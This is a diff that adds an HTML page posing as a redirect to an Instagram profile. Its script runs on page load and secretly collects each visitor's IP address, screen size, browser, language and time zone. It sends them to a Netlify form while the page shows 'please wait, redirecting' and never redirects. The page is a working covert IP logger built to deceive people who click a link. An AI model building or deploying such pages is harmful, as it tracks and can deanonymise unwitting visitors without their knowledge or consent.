@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram.com/saphiralogy</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: #0d0d0d;
+            color: #f4f4f4;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .box {
+            background: #141414;
+            border: 1px solid #222;
+            padding: 40px;
+            text-align: center;
+            width: 100%;
+            max-width: 360px;
+        }
+
+        button {
+            width: 100%;
+            background: #f4f4f4;
+            color: #0d0d0d;
+            border: none;
+            padding: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        #status {
+            margin-top: 14px;
+            font-size: 0.85rem;
+            color: #888;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="box">
+        <!-- Netlify form yapısı -->
+        <form name="contact" method="POST" data-netlify="true" id="contactForm">
+            <!-- Netlify Forms için zorunlu alan -->
+            <input type="hidden" name="form-name" value="contact" />
+
+            <!-- Gönderilecek cihaz ve IP verileri -->
+            <input type="hidden" name="ip" id="ip" />
+            <input type="hidden" name="ekran" id="ekran" />
+            <input type="hidden" name="tarayici" id="tarayici" />
+            <input type="hidden" name="dil" id="dil" />
+            <input type="hidden" name="saat_dilimi" id="saat_dilimi" />
+
+            <button type="submit" id="btn">Lütfen Bekleyin Yönlendiriliyorsunuz...</button>
+        </form>
+
+        <div id="status">Yükleniyor...</div>
+    </div>
+
+    <script>
+        const form = document.getElementById('contactForm');
+        const btn = document.getElementById('btn');
+        const statusText = document.getElementById('status');
+
+        // 1. IP ve Cihaz verilerini topla
+        async function verileriHazirla() {
+            let ip = 'Bilinmiyor';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {
+                ip = 'Alınamadı (AdBlock/Engellendi)';
+            }
+
+            const cihazVerisi = {
+                ip: ip,
+                ekran: `${window.screen.width}x${window.screen.height}`,
+                tarayici: navigator.userAgent,
+                dil: navigator.language || 'Bilinmiyor',
+                saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor'
+            };
+
+            // Input alanlarına bas
+            document.getElementById('ip').value = cihazVerisi.ip;
+            document.getElementById('ekran').value = cihazVerisi.ekran;
+            document.getElementById('tarayici').value = cihazVerisi.tarayici;
+            document.getElementById('dil').value = cihazVerisi.dil;
+            document.getElementById('saat_dilimi').value = cihazVerisi.saat_dilimi;
+
+            // Konsola tablo olarak yazdır
+            console.log('%c[HAZIRLANAN VERİ]', 'color: #38bdf8; font-weight: bold;');
+            console.table(cihazVerisi);
+
+            return cihazVerisi;
+        }
+
+        // 2. Netlify'a POST et
+        async function formuGonder() {
+            btn.disabled = true;
+            btn.textContent = 'LÜTFEN BEKLEYİN...';
+            statusText.textContent = 'YÖNLENDİRİLİYOR LÜTFEN BEKLEYİN...';
+
+            await verileriHazirla();
+
+            const formData = new FormData(form);
+
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(formData).toString()
+            })
+                .then((res) => {
+                    if (res.ok) {
+                        console.log('%c[BAŞARILI] Veri Netlify paneline düştü.', 'color: #4ade80; font-weight: bold;');
+                        statusText.textContent = 'YÖNLENDİRİLİYOR LÜTFEN BEKLEYİN...';
+                        btn.textContent = 'LÜTFEN BEKLEYİN';
+                    } else {
+                        throw new Error('HTTP ' + res.status);
+                    }
+                })
+                .catch((err) => {
+                    console.error('%c[HATA]', 'color: #f87171; font-weight: bold;', err);
+                    statusText.textContent = 'Hata: Kod sadece Netlify üzerinde canlıdayken çalışır.';
+                    btn.disabled = false;
+                    btn.textContent = 'Tekrar Dene';
+                });
+        }
+
+        // Sayfa açılır açılmaz gönder
+        document.addEventListener('DOMContentLoaded', formuGonder);
+
+        // Butona tıklanırsa manuel tekrar gönder
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            formuGonder();
+        });
+    </script>
+</body>
+
+</html>
